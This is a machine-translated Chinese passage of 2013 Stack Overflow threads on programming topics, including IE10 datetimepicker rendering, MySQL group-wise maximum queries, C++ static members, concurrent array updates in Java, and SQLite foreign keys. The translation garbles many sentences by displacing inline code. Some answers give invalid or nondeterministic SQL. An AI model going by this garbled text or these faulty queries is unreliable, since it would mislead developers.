> 
> 时间：2013-03-15T23:57:06.190

指数位有两个保留值，一个用于编码`0`和次正规数，一个用于编码∞和 NaN。因此，正态指数的范围比您预期的要小两个。请参阅 IEEE-754 标准的第 3.4 节（`w`是指数中的位数 -`11`在 的情况下`binary64`）：

> 编码的偏置指数 E 的范围应包括：
> 
> ^(― 1 到 2 w) – 2（含）之间的每个整数，用于编码正常数字
> 
> ― 保留值 0 用于编码 ±0 和次正规数
> 
> ― 保留值 2 ^w – 1 用于编码 ±∞ 和 NaN。

# jquery - jquery Trent Richardson 日期时间选择器在 Windows 8 IE10 上不起作用

> ID：15443889
> 
> 赞同：3
> 
> 时间：2013-03-15T23:49:15.667
> 
> 标签：jquery, datetimepicker

我正在使用[Trent Richardson 日期时间选择器](http://trentrichardson.com/examples/timepicker/)。它适用于除 Windows 8 IE 10 之外的所有操作系统和浏览器。即使在 Windows 7 IE 10 中也能正常工作。在 Windows 8、IE 10 中，当我在不同日期之间切换时，我可以看到日期时间选择器被打乱。我看到一些乱码而不是数字。以下是此类布局的屏幕截图。有没有人遇到过这个问题。我的时间选择器现在用于生产并因此造成很多麻烦。请帮助我找到解决此问题的方法

![日期时间选择器1](../Images/15d556fd77d118ecef0ad0214a8cb0cf.png)

![日期时间选择器2](../Images/d62407a8d8d42985732db30186c4608c.png)

这是正在使用的代码。我有一个文本框

```
 <input type=text name="marketDate" id="marketDate" value="" /> 
```

我像这样关联日期时间选择器

```
 $("#marketDate").datetimepicker({
        showSecond: true,
        timeFormat: 'hh:mm:ss',
        duration: 'fast',
        changeYear: true,
        changeMonth: true
     }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T06:39:08.657

我已经在 IE-10 中的 Windows 8 64 位上测试了这个，设置了所有正常的标准和 IE10 模式。请确认您的 IE10 设置没有启用 Quirks 模式，也没有启用较低版本的 IE。这有时会在使用开发者工具进行测试时发生变化。按 F12 以获取底部的开发人员工具栏。下面是我根据他在他的网站上的示例以及我的 IE10 设置为我的屏幕截图。

![工作示例](../Images/b4607afe0c9f35be0963a7c270a323ba.png)

![已设置 IE10 模式](../Images/b5646543409612eb774a81a91b8b08a6.png)

![标准模式正常](../Images/3d1f2dc1f4df37935d02c1ccb6065acb.png)

你只提到你看到的，但说你在生产代码中使用它......你有没有从客户那里得到任何关于它不起作用的消息？否则它可能只是你的系统。

最后，正如评论中所建议的那样，询问开发人员是您了解为什么您可能有特殊情况的第一个最佳选择。也许您的生产代码中的其他东西会干扰代码并导致它在 IE10 中的行为不同。如果没有进一步的测试或带有要调试的实时代码的 URL，很难判断。

# mysql - GROUP BY mysql中的最大值

> ID：15443895
> 
> 赞同：0
> 
> 时间：2013-03-15T23:50:21.457
> 
> 标签：mysql

假设我有以下两个条目：

```
`id`     |    `timestamp`   |   `content`   |  `reference`
 1       |     2012-01-01   |    NEWER      |   1
 2       |     2013-01-01   |    NEWEST     |   1
 3       |     2011-01-01   |    OLD        |   2 
```

我的查询需要以下结果：

```
`id`     |    `timestamp`   |   `content`   |  `reference`
 2       |     2013-01-01   |    NEWEST     |   1
 3       |     2011-01-01   |    OLD        |   2 
```

这是我到目前为止所拥有的，但它是不正确的：

```
SELECT * FROM table GROUP BY reference 
```

这里正确的查询是什么？

我正在寻找`content`每个参考 id 的最新部分。在上面的示例中，有两个参考 ID（1 和 2），我想获取每个的最新条目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:57:14.620

```
SELECT * 
FROM (SELECT * FROM table ORDER BY timestamp desc) as sub
GROUP BY reference 
```

如果您希望扩展查询，请将限制逻辑放入子查询中以获得更好的性能：

```
SELECT * 
FROM (SELECT * 
      FROM table 
      WHERE 1=1 and 2=2
      ORDER BY timestamp desc
     ) as sub
GROUP BY reference 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:57:32.733

我认为您想要每个参考中的最新版本？像这样的东西：

```
SELECT * FROM my_table
WHERE id IN (
  SELECT id FROM my_table ORDER BY timestamp DESC GROUP BY reference LIMIT 1
); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:57:50.150

```
select * from table where reference_id in 
    (select max(id) from table group by reference) 
```

# c++ - 声明普通类和类模板的静态数据成员

> ID：15443901
> 
> 赞同：0
> 
> 时间：2013-03-15T23:51:14.343
> 
> 标签：c++, oop, static, constants

我读到在源文件中定义静态数据成员的原因是因为如果它们在头文件中并且多个源文件包含头文件 - 定义将多次输出。我可以看到为什么这对于静态 const 数据成员来说是个问题，但是为什么这对于静态数据成员来说是个问题呢？

如果定义写在头文件中，我不太确定我是否完全理解为什么会出现问题......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T00:34:32.357

变量的多重定义问题是由于语言定义中的两个主要缺陷。

如下所示，您可以轻松解决它。没有直接支持没有*技术*原因。这与委员会成员选择将其作为优先事项的功能没有足够高的需求有关。

首先，为什么多重定义通常是一个问题。由于 C++ 缺乏对单独编译模块的支持（缺陷 #1），程序员必须通过使用文本预处理等来模拟该功能。然后很容易*无意中*引入两个或多个同名定义，这很可能是错误的。

对于函数，这是通过`inline`关键字和属性解决的。独立函数只能是显式`inline`的，而成员函数可以`inline`通过在类定义中定义而隐式地定义。无论哪种方式，如果一个函数是，`inline`那么它可以在多个翻译单元中定义，并且必须在使用它的每个翻译单元中定义，并且这些定义必须是等价的。

主要是该解决方案允许在头文件中定义类。

不需要这样的语言特性来支持数据，头文件中定义的变量，所以它不存在：你不能有`inline`变量。这是语言缺陷#2。

但是，您可以通过对类模板的数据成员的特殊豁免来获得变量的*效果。*豁免的原因是类模板通常必须在头文件中完全定义（除非模板仅在翻译单元内部使用），因此对于能够具有数据成员的类模板，有必要使用一般规则的豁免或某些特殊支持。委员会选择了豁免规则路线。`inline``static``static`

```
template< class Dummy >
struct math_
{
    static double const pi;
};

template< class Dummy >
double const math_<Dummy>::pi = 3.14;

typedef math_<void> math; 
```

以上被称为**模板化的 const 技巧**。据我所知，我曾经是在 [comp.lang.c++] Usenet 组中介绍它的人，所以我不能把功劳归功于其他人。我也在 SO 上发布了几次。

无论如何，这意味着每个 C++ 编译器和链接器都在内部支持并且必须支持`inline`数据所需的机制，但该语言没有该功能。

但是，另一方面，C++11 有`constexpr`，您可以将上面的内容写成

```
struct math
{
    static double constexpr pi = 3.14;
}; 
```

嗯，有一个区别，你不能获取 C++11 的地址`math::pi`，但这是一个非常小的限制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:59:17.337

我认为您混淆了两件事：`static`数据成员和全局变量标记为`static`.

后者有*内部链接*，这意味着如果你把它们的定义放在一个包含多个翻译单元的头文件中`#include`，每个翻译单元都会收到这些变量的*私有副本*。

默认情况下，标记为具有内部链接的全局变量`const`，因此您无需`static`明确指定这些变量。因此，链接器不会抱怨全局变量或标记为`const`的全局非变量的多个定义，而在其他情况下会抱怨（因为这些变量将具有外部链接）。`const``static`

关于`static`数据成员，这就是 C++11 标准的第 9.4.2/5 段所说的：

> `static`命名空间范围内的类的数据成员**具有外部链接**（3.5）。本地类不应有 `static`数据成员。

这意味着，如果您将它们的定义放在由多个翻译单元组成的头文件d 中，那么无论它们的-qualification 是什么`#include`，您最终都会在相应的目标文件中得到同一符号的多个定义（就像非全局变量一样） . 在这种情况下，您的程序将违反**[One Definition Rule](http://en.wikipedia.org/wiki/One_Definition_Rule)**。`const``const`

另外，[**这个关于 StackOverflow 的 Q&A**](https://stackoverflow.com/questions/11300652/static-data-member-initialization)可能会让你对这个主题有更清晰的理解。

# python - 用命名列/行python重新排列矩阵

> ID：15443902
> 
> 赞同：1
> 
> 时间：2013-03-15T23:51:16.160
> 
> 标签：python, matrix

我被困住了（而且时间有点紧），希望能得到一些帮助。这可能是一个简单的任务，但我似乎无法解决它..

我有一个矩阵，比如 5 x 5，在文本文件中还有一个额外的起始列名称和列名称，如下所示：

```
b e a d c
b 0.0 0.1 0.3 0.2 0.5
e 0.1 0.0 0.4 0.9 0.3
a 0.3 0.4 0.0 0.7 0.6
d 0.2 0.9 0.7 0.0 0.1
c 0.5 0.3 0.6 0.1 0.0 
```

我有多个文件具有相同的矩阵格式和大小，但名称的顺序不同。我需要一种方法来改变它们，使它们都相同并保持 0.0 对角线。因此，我对列进行的任何交换都必须对行进行。

我一直在搜索，似乎 NumPy 可能会做我想做的事，但我从来没有使用过它或一般的数组。任何帮助是极大的赞赏！

简而言之：如何将文本文件放入一个数组中，然后我可以将行和列交换为所需的顺序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-16T00:05:57.047

我建议你使用熊猫：

```
from StringIO import StringIO
import pandas as pd
data = StringIO("""b e a d c
b 0.0 0.1 0.3 0.2 0.5
e 0.1 0.0 0.4 0.9 0.3
a 0.3 0.4 0.0 0.7 0.6
d 0.2 0.9 0.7 0.0 0.1
c 0.5 0.3 0.6 0.1 0.0
""")
df = pd.read_csv(data, sep=" ")
print df.sort_index().sort_index(axis=1) 
```

输出：

```
 a    b    c    d    e
a  0.0  0.3  0.6  0.7  0.4
b  0.3  0.0  0.5  0.2  0.1
c  0.6  0.5  0.0  0.1  0.3
d  0.7  0.2  0.1  0.0  0.9
e  0.4  0.1  0.3  0.9  0.0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T00:09:15.497

这是一个可怕的 Numpy 版本的开始（使用 HYRY 的答案......）

```
import numpy as np

with open("myfile", "r") as myfile:
    lines = myfile.read().split("\n")
    floats = [[float(item) for item in line.split()[1:]] for line in lines[1:]]
    floats_transposed = np.array(floats).transpose().tolist() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-16T00:30:46.440

```
from copy import copy

f = open('input', 'r')
data = []
for line in f:
    row = line.rstrip().split(' ')
    data.append(row)

#collect labels, strip empty spaces
r = data.pop(0)
c = [row.pop(0) for row in data]
r.pop(0)

origrow, origcol = copy(r), copy(c)

r.sort()
c.sort()

newgrid = []
for row, rowtitle in enumerate(r):
    fromrow = origrow.index(rowtitle)
    newgrid.append(range(len(c)))
    for col, coltitle in enumerate(c):
        #We ask this len(row) times, so memoization
        #might matter on a large matrix
        fromcol = origcol.index(coltitle)
        newgrid[row][col] = data[fromrow][fromcol]

print "\t".join([''] + r)
clabel = c.__iter__()
for line in newgrid:
    print "\t".join([clabel.next()] + line) 
```

# sorting - 按 javascript 字母排序的列表

> ID：15443904
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:51:27.807
> 
> 标签：sorting

我有这个代码：

```
<h2 class="title">A-Z Categories</h2>
<div id="cat-abc">

<div class="cat-top">
<ul>
<li>January</li>
<li>May</li>
<li>November</li>
<li>August</li>
</ul>
</div>

<div class="cat-top">
<ul>
<li>March</li>
<li>June</li>
<li>September</li>
<li>December</li>
</ul>
</div>

</div> 
```

我想按字母顺序对这些项目进行排序。如何按 javascript 按字母顺序列出？

八月
十二月
一月
六月

三月
五月
十一月
九月
谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-17T07:34:03.710

我想输出看起来像按字母顺序排序项目：

八月
十二月
一月
六月

三月
五月
十一月
九月

# java - “原子地”更新整个数组

> ID：15443906
> 
> 赞同：8
> 
> 时间：2013-03-15T23:51:45.620
> 
> 标签：java, performance, data-structures, concurrency, locking

我有一个编写器线程和一个读取器线程来更新和处理数组池（存储在映射中的引用）。写入与读取的比率几乎为 5:1（写入延迟是一个问题）。

编写器线程需要根据某些事件更新池中数组的少数元素。整个写操作（所有元素）需要是原子的。

如果写入器线程正在更新它，我想确保读取器线程读取先前更新的数组（类似于 volatile 但在整个数组而不是单个字段上）。基本上，我可以负担得起读取过时的值，但不会阻塞。

此外，由于写入如此频繁，因此在读/写时创建新对象或锁定整个数组会非常昂贵。

是否有更有效的数据结构可以使用或使用更便宜的锁？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T00:18:11.877

这个想法怎么样：编写器线程不会改变数组。它只是将更新排队。

读取器线程在进入需要阵列稳定快照的读取会话时，将排队更新应用到阵列，然后读取阵列。

```
class Update
{
    int position;
    Object value;
}

ArrayBlockingQueue<Update> updates = new ArrayBlockingQueue<>(Integer.MAX_VALUE);

void write()
{
    updates.put(new Update(...));
}

Object[] read()
{
    Update update;
    while((update=updates.poll())!=null)
        array[update.position] = update.value;

    return array;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-16T01:05:06.723

另一个想法，假设数组只包含 20 个双精度数。

有两个数组，一个用于写入，一个用于读取。

读取器在读取期间锁定读取数组。

```
read()
    lock();
    read stuff
    unlock(); 
```

Writer先修改写数组，然后*tryLock*读数组，如果锁定失败，罚款，write()返回；如果锁定成功，则将写入数组复制到读取数组，然后释放锁定。

```
write()
    update write array
    if tryLock()
        copy write array to read array
        unlock() 
```

可以阻止阅读器，但仅限于复制 20 个双打所需的时间，这很短。

读者应该使用自旋锁，`do{}while(tryLock()==false);`以免被挂起。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-16T01:52:49.650

> 有没有更高效的数据结构？

是的，一点没错！它们被称为持久数据结构。它们能够仅通过存储与先前版本的*差异*来表示矢量/地图/等的新版本。所有版本都是不可变的，这使得它们适合并发（作者不会干扰/阻止读者，反之亦然）。

为了表达变化，人们将对持久数据结构的引用存储在引用类型中，例如`AtomicReference`，并更改这些引用指向的内容——*而不是结构本身*。

[Clojure](http://clojure.org/)提供了一流的持久数据结构实现。它们是用纯粹、高效的 Java 编写的。

以下程序公开了如何使用持久数据结构来解决您描述的问题。

```
import clojure.lang.IPersistentVector;
import clojure.lang.PersistentVector;

public class AtomicArrayUpdates {

    public static Map<Integer, AtomicReference<IPersistentVector>> pool
        = new HashMap<>();
    public static Random rnd = new Random();
    public static final int SIZE = 60000;
    // For simulating the reads/writes ratio
    public static final int SLEEP_TIMÉ = 5;

    static {        
        for (int i = 0; i < SIZE; i++) {
            pool.put(i, new AtomicReference(PersistentVector.EMPTY));
        }
    }

    public static class Writer implements Runnable {   
        @Override public void run() {
            while (true) {
                try {
                    Thread.sleep(SLEEP_TIMÉ);
                } catch (InterruptedException e) {}

                int index = rnd.nextInt(SIZE);
                IPersistentVector vec = pool.get(index).get();

                // note how we repeatedly assign vec to a new value
                // cons() means "append a value".
                vec = vec.cons(rnd.nextInt(SIZE + 1)); 
                // assocN(): "update" at index 0
                vec = vec.assocN(0, 42); 
                // appended values are nonsense, just an example!
                vec = vec.cons(rnd.nextInt(SIZE + 1)); 

                pool.get(index).set(vec);

            }
        }
    }

    public static class Reader implements Runnable {
        @Override public void run() {
            while (true) {
                try {
                    Thread.sleep(SLEEP_TIMÉ * 5);
                } catch (InterruptedException e) {}

                IPersistentVector vec = pool.get(rnd.nextInt(SIZE)).get();
                // Now you can do whatever you want with vec.
                // nothing can mutate it, and reading it doesn't block writers!
            }
        } 
    }

    public static void main(String[] args) {
        new Thread(new Writer()).start();
        new Thread(new Reader()).start();
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-16T11:56:57.087

我会这样做：

*   同步整个事情，看看性能是否足够好。考虑到你只有一个写线程和一个读线程，争用会很低，这可以很好地工作

    ```
    private final Map<Key, double[]> map = new HashMap<> ();

    public synchronized void write(Key key, double value, int index) {
        double[] array = map.get(key);
        array[index] = value;
    }

    public synchronized double[] read(Key key) {
        return map.get(key);
    } 
    ```

*   如果太慢，我会让作者复制数组，更改一些值并将新数组放回地图。请注意，[数组副本非常快](https://stackoverflow.com/a/12157504/829571)- 通常，一个 20 项数组很可能需要不到 100 纳秒

    ```
    //If all the keys and arrays are constructed before the writer/reader threads 
    //start, no need for a ConcurrentMap - otherwise use a ConcurrentMap
    private final Map<Key, AtomicReference<double[]>> map = new HashMap<> ();

    public void write(Key key, double value, int index) {
        AtomicReference<double[]> ref = map.get(key);
        double[] oldArray = ref.get();
        double[] newArray = oldArray.clone();
        newArray[index] = value;
        //you might want to check the return value to see if it worked
        //or you might just skip the update if another writes was performed
        //in the meantime
        ref.compareAndSet(oldArray, newArray);
    }

    public double[] read(Key key) {
        return map.get(key).get(); //check for null
    } 
    ```

> 由于写入如此频繁，因此在读/写时创建新对象或锁定整个数组将非常昂贵。

多频繁？除非每毫秒有数百个，否则应该没问题。

另请注意：

*   在 Java 中创建对象相当便宜（想想大约 10 个 CPU 周期 = 几纳秒）
*   短期对象的垃圾回收通常是免费的（只要对象留在年轻代，如果它不可达，GC 就不会访问它）
*   而长寿命对象对 GC 性能有影响，因为它们需要被复制到老年代

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-16T05:58:41.813

*   您需要两个静态引用：`readArray`和`writeArray`一个简单的互斥锁来跟踪写入何时更改。

*   有一个名为 changeWriteArray 的锁定函数对 writeArray 的 deepCopy 进行更改：

    synchronized String[] changeWriteArray(String[] writeArrayCopy, other params go here){ // 这里对 writeArray 的 deepCopy 进行修改

    ```
     //then return deepCopy
          return writeArrayCopy;
    } 
    ```

*   请注意，`changeWriteArray`它实际上是没有副作用的函数式编程，因为它返回的副本既不是`readArray`也不是`writeArray`。

*   打电话的人`changeWriteArray`必须称其为`writeArray = changeWriteArray(writeArray.deepCopy())`.

*   互斥体由两者更改`changeWriteArray`，`updateReadArray`但仅由`updateReadArray`. 如果设置了互斥锁，则将简单地指向实际块的`updateReadArray`引用`readArray``writeArray`

编辑：

@vemv 关于您提到的答案。虽然想法是相同的，但区别很重要：两个静态引用是`static`这样的，因此无需花费时间将更改实际复制到`readArray`; 而是将指针`readArray`移动到指向`writeArray`。实际上，我们通过`changeWriteArray`根据需要生成的 tmp 数组进行交换。此外，这里的锁定是最小的，因为阅读不需要锁定，因为您可以在任何给定时间拥有多个阅读器。

事实上，使用这种方法，您可以保留并发读者的计数，并检查计数器是否为零，以了解何时`readArray`更新`writeArray`; 再次，进一步说明阅读根本不需要锁定。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-17T23:50:45.493

改进@zhong.j.yu 的答案，将写入排队而不是在写入发生时尝试执行它们确实是一个好主意。然而，当更新来得如此之快以至于读者会因不断地更新而窒息时，我们必须解决这个问题。我的想法是，如果读取只执行在读取之前排队的写入，而忽略后续写入（那些将是下一次阅读解决）。

您将需要编写自己的同步队列。它将基于链表，并且仅包含两种方法：

```
public synchronised enqeue(Write write); 
```

此方法将以原子方式将写入排入队列。当写入速度比将它们排队所需的速度更快时，可能会出现死锁，但我认为每秒必须有数十万次写入才能实现这一目标。

```
public synchronised Element cut(); 
```

这将自动清空队列并将其头部（或尾部）作为 Element 对象返回。它将包含一系列其他元素（Element.next 等...，只是通常的链表内容），所有这些元素都代表自上次读取以来的写入链。然后队列将是空的，准备好接受新的写入。然后读者可以跟踪元素链（到那时它将是独立的，不受后续写入的影响），执行写入，最后执行读取。当阅读器处理读取时，新的写入将排入队列，但这将是下一次读取的问题。

我写过一次，虽然是用 C++ 来表示一个声音数据缓冲区。写入（驱动程序发送更多数据）多于读取（数据上的一些数学内容），而写入必须尽快完成。（数据是实时来的，所以我需要在驱动程序中准备好下一批之前保存它们。）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-16T03:10:19.800

以下变体的灵感来自[我之前的回答](https://stackoverflow.com/a/15444713/569050)和[zhong.j.yu 的](https://stackoverflow.com/a/15444421/569050)回答。

编写者不会干扰/阻止读者，反之亦然，并且不存在线程安全/可见性问题，或者正在进行微妙的推理。

```
public class V2 {

    static Map<Integer, AtomicReference<Double[]>> commited = new HashMap<>();
    static Random rnd = new Random();

    static class Writer {
        private Map<Integer, Double[]> writeable = new HashMap<>();
        void write() {        
            int i = rnd.nextInt(writeable.size());   
            // manipulate writeable.get(i)...
            commited.get(i).set(writeable.get(i).clone());
        }
    }

    static class Reader{
        void read() {
            double[] arr = commited.get(rnd.nextInt(commited.size())).get();
            // do something useful with arr...
        } 
    }

} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-09-12T22:14:27.163

我有一个有趣的解决方案，使用三个数组和一个 volatile 布尔切换。基本上，两个线程都有自己的数组。此外，还有一个通过切换控制的共享阵列。

当编写器完成并且切换允许它时，它将新写入的数组复制到共享数组中并翻转切换。

同样，在阅读器启动之前，当切换允许时，它会将共享数组复制到自己的数组中并翻转切换。

```
public class MolecularArray {
    private final double[] writeArray;
    private final double[] sharedArray;
    private final double[] readArray;

    private volatile boolean writerOwnsShared;

    MolecularArray(int length) {
        writeArray = new double[length];
        sharedArray = new double[length];
        readArray = new double[length];
    }

    void read(Consumer<double[]> reader) {
        if (!writerOwnsShared) {
            copyFromTo(sharedArray, readArray);
            writerOwnsShared = true;
        }
        reader.accept(readArray);
    }

    void write(Consumer<double[]> writer) {
        writer.accept(writeArray);
        if (writerOwnsShared) {
            copyFromTo(writeArray, sharedArray);
            writerOwnsShared = false;
        }
    }

    private void copyFromTo(double[] from, double[] to) {
        System.arraycopy(from, 0, to, 0, from.length);
    }
} 
```

*   这取决于“单写线程和单读”假设。
*   它从不阻塞。
*   它使用恒定（尽管巨大）的内存量。
*   `read`没有任何干预的重复调用`write`不会复制，反之亦然。
*   读者不一定会看到最新的数据，但它会看到从前一个`write`开始的数据`read`，如果有的话。

我想，这可以使用两个共享数组来改进。

# objective-c - IBOutlet 已连接但不工作

> ID：15443907
> 
> 赞同：0
> 
> 时间：2013-03-15T23:51:56.727
> 
> 标签：objective-c, cocoa, iboutlet

我有一个带有 IBAction 的类（dicecontroller），它会触发一些 IBOutlets，一切都很开心。从那以后，我找到了一种更好的方法来组织我的代码并将 IBAction 放在不同的类（playercommand）中。playercomman 调用 dicecontroller 中的一个方法，该方法具有所有 IBOutlets，但现在没有一个 outlet 显示任何内容。我用 xib 重新连接了网点，甚至制作了新的网点，但似乎没有任何形式的 IBOutlets 可以工作。但是 NSLog 工作得很好，我传递的数组也被很好地接收了。

我最近遇到了 Xcode 表现怪异和崩溃的问题，这通过重新安装 Xcode 得到了修复，我再次这样做，认为这可能是另一个故障，但没有爱。我在想这是我不知道的 IB 的一些细微差别

我也真的不知道如何查找这个，一直试图找到几个小时的东西。帮助将是令人鼓舞的。

玩家命令.h

```
#import "DiceRoll.h"
#import "diceController.h"

@interface playerCommand : NSObject

- (IBAction)roll:(NSButton *)sender;

@end 
```

玩家命令.m

```
#import "playerCommand.h"

@implementation playerCommand

- (IBAction)roll:(NSButton *)sender {

    DiceRoll *currentTurn = [[DiceRoll alloc] init];
    [currentTurn rolldice];

    diceController *currentFields = [[diceController alloc] init];
    [currentFields updatetockNameField:[currentTurn diceValuesArray]];

}
@end 
```

骰子控制器.h

```
@interface diceController : NSObject

-(void)updatetockNameField: (NSArray*) diceValues;

@end 
```

骰子控制器.m

```
#import "diceController.h"

// declaring private properties

@interface diceController()

@property (weak) IBOutlet NSTextField *ActionField;

@property (weak) IBOutlet NSTextField *QuantityField;

@end

@implementation diceController

-(void)updatetockNameField:(NSArray *) diceValues {

    switch ([[diceValues objectAtIndex:2] integerValue]) {
      case 0 ... 1:
        [[self ActionField] setStringValue:@"Up"];
        break;
      case 2 ... 3:
        [[self ActionField] setStringValue:@"Down"];
        break;
      case 4 ... 5:
        [[self ActionField] setStringValue:@"Div"];
        break;
      default:
        [[self ActionField] setStringValue:@"Err"];
        break;
    }

    switch ([[diceValues objectAtIndex:2] integerValue]) {
      case 0 ... 1:
        [[self QuantityField] setIntegerValue:5];
        break;
      case 2 ... 3:
        [[self QuantityField] setIntegerValue:10];
        break;
      case 4 ... 5:
        [[self QuantityField] setIntegerValue:20];
        break;
      default:
        [[self QuantityField] setStringValue:@"E"];
        break;
    }

} //end of updatetockNameField method

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:59:22.463

问题在这里：

> `diceController *currentFields = [[diceController alloc] init];`

此`diceController`实例是一个新实例（您在此行中创建它）。这与`diceController`您已经在 nib 中放置和配置的实例不同。

如果您的`playerCommand`实例需要`diceController`在 nib 中引用您的实例，那么您可以在其中创建一个 IBOutlet`playerCommand`并将其连接到`diceController`您的 nib 中的实例。

顺便说一句，`playerCommand`应该`diceController`分别命名为`PlayerCommand`和`DiceController`。

# mysql - 外键不能保持数据一致性

> ID：15443908
> 
> 赞同：0
> 
> 时间：2013-03-15T23:52:00.233
> 
> 标签：mysql, foreign-keys

很多天前，我创建了一个包含两个表的数据库：

*   成员（member_id（PK），名称）
*   帐户（account_id（PK），member_id（FK），金额）。

所以通常`DELETE`如果成员在帐户表中有余额，我不能有任何成员。在它运作良好之前。但是今天我导入了相同的脚本，我可以删除一个成员，即使成员在帐户表中有余额。

不知道怎么回事？我不记得以前的服务器版本的mysql。现在我正在运行`mysql 5.5.16`，MySQL 客户端版本是`mysqlnd 5.0.8-dev - 20102224 - Revision: 310735 in localhost`.

我的代码是

```
//account table
CREATE TABLE IF NOT EXISTS `account` (
   `account_id` int(11) NOT NULL AUTO_INCREMENT,
   `member_id` int(11) NOT NULL,
   `dates` date NOT NULL,
   `amount` float NOT NULL,
   PRIMARY KEY (`account_id`),
   KEY `FK_account_1` (`member_id`)
   ) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

//member table
CREATE TABLE IF NOT EXISTS `member` (
  `member_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `account_num` int(11) NOT NULL,
  PRIMARY KEY (`member_id`)
  ) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=34 ;

//and this code
ALTER TABLE `account`
  ADD CONSTRAINT `FK_account_1`
    FOREIGN KEY (`member_id`) 
    REFERENCES `member`(`member_id`) 
    ON DELETE CASCADE 
    ON UPDATE CASCADE; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:53:04.037

我不确定我是否理解这一点，但是：

您拥有的约束意味着每次删除成员时，该成员将连同其在帐户表中的任何余额一起被删除。( `ON DELETE CASCADE`)

如果这不是您想要的行为，并且您希望 mysql 在删除具有余额的成员时引发异常；然后**从您的约束定义****中删除该** 行。`ON DELETE CASCADE`

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T00:04:42.883

```
ALTER TABLE account
ADD CONSTRAINT `fk_account_member` 
FOREIGN KEY (`member_id`)
REFERENCES `member` (`member_id`)
ON DELETE CASCADE
ON UPDATE CASCADE; 
```**

# sqlite - sqlite3“外键约束失败”

> ID：15443913
> 
> 赞同：27
> 
> 时间：2013-03-15T23:52:33.310
> 
> 标签：sqlite, foreign-keys

我已经设置了两个表：

```
CREATE TABLE A
(
    id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    name TEXT
 );

CREATE TABLE B
(
    id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    id2 INTEGER,
    book TEXT,
    FOREIGN KEY(id2) REFERENCES A(id)
); 
```

在我插入数据后`A`，它看起来像这样：

```
1    John

2    Amy

3    Peter 
```

在我插入数据后`B`，它看起来像这样：

```
1     1     Lord of the Rings

2     1     Catch 22

3     2     Sum of All Fears

4     3     Hunt for Red October 
```

然后我执行以下语句：

```
delete from a where id=1; 
```

我得到以下信息：`"Error: foreign key constraint failed"`

然后我重新启动并重`sqlite3`试，但这次我先输入：

```
PRAGMA foreign_keys = 1; 
```

它仍然不起作用......

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-03-16T16:35:35.787

`Table B`具有其外键引用您尝试删除的行的主键值的`Table A`行，因此删除它会违反数据库的完整性。

您可以包含`ON DELETE CASCADE`在您的外键定义中。这样，当您从中删除条目时，链接到已删除行的`Table A`任何条目也将被删除。`Table B`不知道这是否适合您的应用程序。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-16T00:03:40.173

“问题”是您在表 B 上设置了外键。

```
foreign key(id2) references A(id) 
```

这意味着`id2`表 B 中的列引用`id`表 A 中的列。`Lord of the Rings`和`Catch 22`from`Table B`都链接到`John`from `Table A`。因此，如果`John`不先删除其他两个条目，则无法删除`Table B`。

另一种方法是删除外键。

有关更多详细信息，请参阅[此](http://www.sqlite.org/foreignkeys.html)文档。

# php - 插入具有相同公共 ID 的多行

> ID：15443916
> 
> 赞同：0
> 
> 时间：2013-03-15T23:53:02.537
> 
> 标签：php, mysql

我目前正在一次插入多行。我在“协议”表中有一个“id”列，设置为自动递增。这显然是为插入的每一行创建一个新的 id。

有没有办法一次插入所有具有相同 ID 的行？

```
if ($stmt = $mysqli->prepare("INSERT agreement (start, end, customer, manufacturer, item_number, item_description) VALUES (?, ?, ?, ?, ?, ?)")) {
    $stmt->bind_param("ssssss", $start, $end, $customer, $manufacturer, $number, $description);
    for ($i = 0; $i < count($_POST['item']); $i++) {
        $number = $_POST['item'][$i];
        $description = $_POST['description'][$i];
        $theid2 = $theid[$i];
        $stmt->execute();
    }
    $stmt->close();
}
// show an error if the query has an error
else {
    echo "ERROR: Could not prepare SQL statement 1.";
}

// redirect the user
}
$mysqli->error;
$mysqli->close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:58:02.930

如果这是 oracle，答案是肯定的，但是 MySQL 没有序列。为此，您需要一个唯一序列的来源以用于您的记录集。最简单的方法是插入另一个表并从中获取自动递增的键用作您的 id。

# geometry - 给定其他两个点的坐标，求三角形中一个点的坐标

> ID：15443917
> 
> 赞同：0
> 
> 时间：2013-03-15T23:53:06.277
> 
> 标签：geometry, 2d, trigonometry

我有关于二维三角形的以下信息：

*   各边的长度
*   2点坐标

我需要找到最后一点的坐标。

三角形不一定是直角三角形。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:00:43.783

